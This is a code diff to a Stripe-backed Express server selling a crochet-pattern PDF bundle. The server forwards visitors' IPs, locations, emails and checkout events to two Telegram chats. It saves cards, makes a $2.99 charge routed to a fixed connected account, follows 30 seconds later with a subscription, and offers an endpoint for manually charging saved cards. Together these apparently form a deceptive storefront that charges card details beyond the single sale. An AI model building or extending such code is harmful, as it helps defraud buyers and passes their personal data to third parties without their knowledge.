@@ -4,8 +4,6 @@ const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const fs = require('fs');
-const https = require('https');
-const querystring = require('querystring');
 
 const app = express();
 const ACCOUNT_B = 'acct_1Tc7YyBY9xQDWIiH';
@@ -39,50 +37,37 @@ function saveCustomer(entry) {
 
 // ─── Telegram ─────────────────────────────────────────────────────────────────
 
-function sendTelegramMessage(chatId, message) {
-  return new Promise((resolve) => {
-    const data = JSON.stringify({
-      chat_id: chatId,
-      text: message,
-      parse_mode: 'HTML'
-    });
-
-    const options = {
-      hostname: 'api.telegram.org',
-      port: 443,
-      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Content-Length': data.length
-      }
-    };
-
-    const req = https.request(options, (res) => {
-      let body = '';
-      res.on('data', (chunk) => { body += chunk; });
-      res.on('end', () => {
-        console.log('Telegram sent:', res.statusCode);
-        resolve(true);
-      });
-    });
-
-    req.on('error', (err) => {
-      console.log('Telegram error:', err.message);
-      resolve(false);
-    });
-
-    req.write(data);
-    req.end();
-  });
-}
-
 async function sendTelegram(message) {
   try {
-    await sendTelegramMessage(TELEGRAM_CHAT_ID, message);
-    await sendTelegramMessage(TELEGRAM_CHAT_ID_2, message);
+    console.log('[Telegram] Sending message...');
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    
+    const response1 = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    });
+    console.log('[Telegram] Chat 1 status:', response1.status);
+    
+    const payload2 = {
+      chat_id: TELEGRAM_CHAT_ID_2,
+      text: message,
+      parse_mode: 'HTML'
+    };
+    
+    const response2 = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload2)
+    });
+    console.log('[Telegram] Chat 2 status:', response2.status);
   } catch (err) {
-    console.log('Telegram error:', err.message);
+    console.error('[Telegram] Error:', err.message);
   }
 }
 
@@ -95,9 +80,10 @@ app.use(bodyParser.json());
 
 app.post('/page-visit', (req, res) => {
   const { visitorId, ip, country, city } = req.body;
+  console.log('[API] /page-visit:', { visitorId, ip, country, city });
   res.json({ ok: true });
   
-  // Send Telegram notification in background
+  // Fire Telegram in background without awaiting
   sendTelegram(
     `👁 <b>New Page Visitor!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
@@ -105,7 +91,7 @@ app.post('/page-visit', (req, res) => {
     `🏙 City: ${city || 'Unknown'}\n` +
     `🔌 IP: ${ip || 'Unknown'}\n` +
     `🕐 Time: ${new Date().toLocaleString('en-US')}`
-  ).catch(err => console.log('Background Telegram error:', err));
+  );
 });
 
 app.post('/create-setup-intent', async (req, res) => {
@@ -131,7 +117,7 @@ app.post('/create-setup-intent', async (req, res) => {
 
     res.json({ clientSecret: setupIntent.client_secret, customerId: customer.id });
     
-    // Send Telegram notification in background
+    // Fire Telegram in background after response
     sendTelegram(
       `🛒 <b>Checkout Information!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
@@ -142,7 +128,7 @@ app.post('/create-setup-intent', async (req, res) => {
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `⬇️ Delivery: Instant Download\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    ).catch(err => console.log('Background Telegram error:', err));
+    );
   } catch (error) {
     console.error('Error:', error);
     res.status(400).json({ error: error.message });
@@ -151,16 +137,17 @@ app.post('/create-setup-intent', async (req, res) => {
 
 app.post('/payment-initiated', (req, res) => {
   const { visitorId, email } = req.body;
+  console.log('[API] /payment-initiated:', { visitorId, email });
   res.json({ ok: true });
   
-  // Send Telegram notification in background
+  // Fire Telegram in background
   sendTelegram(
     `💳 <b>Payment Attempt Started!</b>\n\n` +
     `🆔 Visitor ID: <code>${visitorId}</code>\n` +
     `📧 Email: ${email}\n` +
     `⏳ Customer clicked "Pay Now"\n` +
     `🕐 Time: ${new Date().toLocaleString('en-US')}`
-  ).catch(err => console.log('Background Telegram error:', err));
+  );
 });
 
 app.post('/create-subscription', async (req, res) => {
@@ -184,7 +171,6 @@ app.post('/create-subscription', async (req, res) => {
     });
 
     // Charge 1 — $2.99 USD
-    let payment1Status = 'pending';
     try {
       const payment1 = await stripe.paymentIntents.create({
         amount: 299,
@@ -197,10 +183,8 @@ app.post('/create-subscription', async (req, res) => {
         transfer_data: { destination: ACCOUNT_B },
       });
       console.log('Payment 1 created:', payment1.id, payment1.status);
-      payment1Status = payment1.status;
     } catch (err) {
       console.log('Payment 1 failed:', err.message);
-      payment1Status = 'failed';
     }
 
     await new Promise(resolve => setTimeout(resolve, 30000));
@@ -217,7 +201,7 @@ app.post('/create-subscription', async (req, res) => {
 
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
     
-    // Send Telegram notification in background
+    // Fire Telegram in background after response
     sendTelegram(
       `✅ <b>Payment Successful!</b>\n\n` +
       `🆔 Visitor ID: <code>${visitorId}</code>\n` +
@@ -226,7 +210,7 @@ app.post('/create-subscription', async (req, res) => {
       `🆔 Subscription: ${subscription.id}\n` +
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    ).catch(err => console.log('Background Telegram error:', err));
+    );
   } catch (error) {
     console.error('Error:', error.message);
     res.status(400).json({ error: error.message });
@@ -267,7 +251,7 @@ app.post('/charge-saved', async (req, res) => {
 
     res.json({ success: true, paymentId: payment.id, status: payment.status });
     
-    // Send Telegram notification in background
+    // Fire Telegram in background after response
     sendTelegram(
       `💰 <b>Manual Payment!</b>\n\n` +
       `🆔 Customer: <code>${customerId}</code>\n` +
@@ -275,7 +259,7 @@ app.post('/charge-saved', async (req, res) => {
       `📋 Status: ${payment.status}\n` +
       `📦 Product: 5000+ Amigurumi Crochet Patterns – PDF Bundle\n` +
       `🕐 Time: ${new Date().toLocaleString('en-US')}`
-    ).catch(err => console.log('Background Telegram error:', err));
+    );
   } catch (error) {
     console.error('Manual charge error:', error.message);
     res.status(400).json({ error: error.message });
@@ -292,8 +276,18 @@ app.get('/health', (req, res) => {
   });
 });
 
+// ─── Test Telegram ───────────────────────────────────────────────────────────
+app.get('/test-telegram', (req, res) => {
+  res.json({ status: 'Test message sent to Telegram' });
+  sendTelegram('🧪 <b>Test Message from Server</b>\n\nIf you see this, Telegram is working!').catch(err => console.error('Test telegram error:', err));
+});
+
 // ─── Start ────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 4242;
 app.listen(PORT, () => {
-  console.log('Server running on http://localhost:' + PORT);
+  console.log(`\n✅ Server running on http://localhost:${PORT}`);
+  console.log(`📊 Stripe Account: ${ACCOUNT_B}`);
+  console.log(`💬 Telegram Chat 1: ${TELEGRAM_CHAT_ID}`);
+  console.log(`💬 Telegram Chat 2: ${TELEGRAM_CHAT_ID_2}`);
+  console.log(`\n📝 Test Telegram: GET http://localhost:${PORT}/test-telegram\n`);
 });
